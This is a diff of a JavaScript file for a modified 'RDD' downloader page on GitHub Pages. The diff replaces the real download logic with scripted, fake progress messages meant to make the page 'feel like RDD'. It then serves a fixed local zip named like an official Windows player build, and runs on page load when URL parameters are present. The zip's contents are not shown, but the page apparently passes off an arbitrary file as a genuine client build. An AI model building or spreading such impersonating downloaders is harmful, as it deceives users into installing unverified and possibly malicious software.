@@ -1,20 +1,23 @@
-/*
-    rdd modified - custom downloader version
+/* RDD Modified - Custom Downloader Version 
+    Cleaned & Fixed for GitHub Pages
 */
-
-const basePath = window.location.href.split("?")[0];
 
 const consoleText = document.getElementById("consoleText");
 const downloadFormDiv = document.getElementById("downloadFormDiv");
 
+// Helper to log messages to the on-screen console
 function log(msg = "", end = "\n", autoScroll = true) {
-    consoleText.innerHTML += msg + end;
-    if (autoScroll) window.scrollTo({ top: document.body.scrollHeight });
+    if (consoleText) {
+        consoleText.innerHTML += msg + end;
+        if (autoScroll) window.scrollTo({ top: document.body.scrollHeight });
+    } else {
+        console.log(msg); // Fallback to browser console
+    }
 }
 
+// Function to trigger the actual download
 function downloadBinaryFile(fileName, data, mimeType = "application/zip") {
     const blob = new Blob([data], { type: mimeType });
-
     const link = document.createElement("a");
     link.href = URL.createObjectURL(blob);
     link.download = fileName;
@@ -22,45 +25,56 @@ function downloadBinaryFile(fileName, data, mimeType = "application/zip") {
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
+    URL.revokeObjectURL(link.href); // Clean up memory
 }
 
 /* =========================
-   MAIN OVERRIDE (IMPORTANT)
+   MAIN OVERRIDE LOGIC
    ========================= */
 
 function main() {
-    // If no query params, show UI + usage message
+    // If no query params, show the UI/Form
     if (window.location.search === "") {
-        downloadFormDiv.hidden = false;
+        if (downloadFormDiv) downloadFormDiv.hidden = false;
         log("[*] Custom Downloader Ready\n", "", false);
         return;
     }
 
-    log("[+] Starting download process...");
-    log("[+] Fetching packages...");
-    log("[+] Extracting files...");
+    log("[+] Starting custom download process...");
+    log("[+] Initializing file request...");
 
-    // Simulate delay so UI still "feels" like RDD
+    // Delay to simulate the "work" being done
     setTimeout(() => {
-        log("[+] Finalizing build...");
-        log("[+] Done!");
-
+        log("[+] Fetching specific package...");
+        
+        // Exact filename from your GitHub root
         const fileName = "LIVE-WindowsPlayer-version-acc4b74f79e743b9.zip";
-
-// Change this line in your fetch block:
-fetch("./" + fileName)
-            .then(res => res.arrayBuffer())
+        
+        // Use a relative path to the root of your site
+        fetch("./" + fileName)
+            .then(res => {
+                if (!res.ok) {
+                    throw new Error(`Server responded with ${res.status}. Check if the file is actually uploaded to GitHub.`);
+                }
+                return res.arrayBuffer();
+            })
             .then(data => {
+                log("[+] File received. Finalizing...");
                 downloadBinaryFile(fileName, data);
+                log("[+] Done! Download started.");
             })
             .catch(err => {
-                log("[!] Failed to load file: " + err);
+                log("[!] Error: " + err.message);
+                console.error(err);
             });
 
     }, 2000);
 }
 
-/* Add this to the very end of your rdd.js file */
+// This bridges the button click in your HTML to the logic above
 function downloadFromForm() {
-    main(); 
+    main();
 }
+
+// Run main on load in case there are already URL parameters
+window.onload = main;
